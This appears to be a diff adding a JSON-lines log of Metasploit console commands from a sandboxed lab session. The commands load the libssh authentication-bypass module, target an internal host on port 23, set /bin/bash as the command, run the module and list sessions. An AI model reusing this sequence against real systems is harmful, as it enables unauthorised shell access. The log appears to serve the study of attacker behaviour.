@@ -1,0 +1,7 @@
+{"sandbox_id": "400", "timestamp_str": "2019-08-14T16:41:56.141268Z", "cmd_type": "msf-command", "cmd": "use scanner/ssh/libssh_auth_bypass"}
+{"sandbox_id": "400", "timestamp_str": "2019-08-14T16:42:05.874700Z", "cmd_type": "msf-command", "cmd": "set rhosts 172.18.1.5"}
+{"sandbox_id": "400", "timestamp_str": "2019-08-14T16:42:11.076477Z", "cmd_type": "msf-command", "cmd": "set rport 23"}
+{"sandbox_id": "400", "timestamp_str": "2019-08-14T16:42:14.730975Z", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "400", "timestamp_str": "2019-08-14T16:42:26.571136Z", "cmd_type": "msf-command", "cmd": "set CMD /bin/bash"}
+{"sandbox_id": "400", "timestamp_str": "2019-08-14T16:42:28.692161Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "400", "timestamp_str": "2019-08-14T16:42:35.435244Z", "cmd_type": "msf-command", "cmd": "sessions"}
